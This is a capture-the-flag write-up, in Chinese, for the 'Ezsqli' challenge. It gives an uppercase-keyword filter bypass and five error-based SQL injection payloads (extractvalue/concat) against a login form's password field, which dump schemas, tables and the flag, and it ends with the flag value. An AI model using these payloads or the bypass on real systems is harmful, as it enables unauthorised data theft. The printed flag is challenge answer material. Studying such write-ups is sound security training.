# Ezsqli

## 思路分析

> 打开地址,有一个登录框,根据题目名字猜想是sql注入,经过测试发现uname和passwd这2处参数存在布尔盲注,在用information_schema时发现有过滤,最后才发现,直接大写就绕过了.

## payload

> uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select mid(group_concat(SCHEMA_NAME),1,32) from INFORMATION_SCHEMA.SCHEMATA))) or '1=1

> uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select substr(GROUP_CONCAT(TABLE_NAME),1,32) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='security'))) or '1=1

> uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select substr(GROUP_CONCAT(COLUMN_NAME),1,32) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='flag'))) or '1=1

> uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select substr(flag_that_you_find_must_be_me,1,32) FROM flag))) or '1=1

> uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select substr(flag_that_you_find_must_be_me,32,64) FROM flag))) or '1=1

## flag

> flag{c7651cb673c911ee8f9977094a220f17}